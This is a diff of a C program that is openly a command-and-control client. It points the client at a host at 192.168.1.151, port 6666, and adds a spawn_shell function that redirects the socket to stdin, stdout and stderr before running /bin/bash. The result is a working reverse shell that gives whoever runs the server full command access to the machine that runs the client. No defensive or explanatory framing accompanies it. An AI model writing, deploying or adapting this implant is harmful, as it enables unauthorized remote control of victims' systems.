@@ -7,8 +7,17 @@
 #include <unistd.h>
 #include <string.h>
 
-#define SERVER_IP "127.0.0.1"
+#define SERVER_IP "192.168.1.151"
 #define SERVER_PORT 6666
+
+void spawn_shell(int socket) {
+  dup2(socket,0);
+  dup2(socket,1);
+  dup2(socket,2);
+
+  char * const argv[] = {"/bin/bash",NULL};
+  execvp("/bin/bash",argv);
+}
 
 void execute_command(int socket, char *command) {
   printf("[Debug] Trying to execute command\n");
@@ -47,16 +56,16 @@ int main(int argc, char *argv[]) {
     exit(-1);
   }
   server_addr.sin_family=AF_INET;
-  server_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
-  server_addr.sin_port=htons(6666);
+  server_addr.sin_addr.s_addr=inet_addr(SERVER_IP);
+  server_addr.sin_port=htons(SERVER_PORT);
   if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
     perror("[Err] Connection failed");
     close(sockd);
     exit(-1);
   }
   printf("[Info] Connected to C2 at %s:%d\n",SERVER_IP,SERVER_PORT);
-  
-  while(1) {
+  spawn_shell(sockd); 
+  /*while(1) {
     read_size=recv(sockd, buffer, sizeof(buffer), 0);
     if(read_size >0) {
        buffer[read_size] = '\0';
@@ -66,10 +75,9 @@ int main(int argc, char *argv[]) {
       printf("[Info] Quitting...\n");
       break;
     }
-
-    execute_command(sockd, buffer);
+    //execute_command(sockd, buffer);
     }
-  }
+  }*/
   close(sockd);
 
   return 0;
